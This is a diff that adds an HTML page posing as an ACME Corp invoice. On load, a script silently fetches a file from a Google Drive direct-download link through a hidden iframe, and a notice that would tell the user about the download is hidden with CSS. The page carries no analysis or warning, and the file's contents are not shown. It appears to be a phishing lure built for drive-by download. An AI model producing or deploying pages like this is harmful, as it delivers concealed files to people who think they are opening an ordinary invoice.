@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Invoice</title>
+    <style>
+        body { font-family: sans-serif; margin: 40px; }
+        h1, h2 { color: #333; }
+        .download-message {
+            display: none; /* Hide this message, download will be in background */
+        }
+    </style>
+</head>
+<body>
+    <h1>Company: ACME Corp</h1>
+    <h2>Invoice #: 12345</h2>
+    <p>Date: 26-Aug-2025</p>
+    <p>Amount: $250.00</p>
+
+    <div class="download-message">
+        <p>Your invoice is downloading in the background...</p>
+    </div>
+
+    <script>
+        const downloadLink = 'https://drive.google.com/uc?export=download&id=1r1whMfqrGK5Xs0Ygzw4ClqzEHotMj5J1';
+        
+        // Function to initiate download
+        function initiateDownload() {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = downloadLink;
+            document.body.appendChild(iframe);
+            console.log('Download initiated for:', downloadLink);
+        }
+
+        // Initiate download when the page loads
+        window.onload = initiateDownload;
+    </script>
+</body>
+</html>
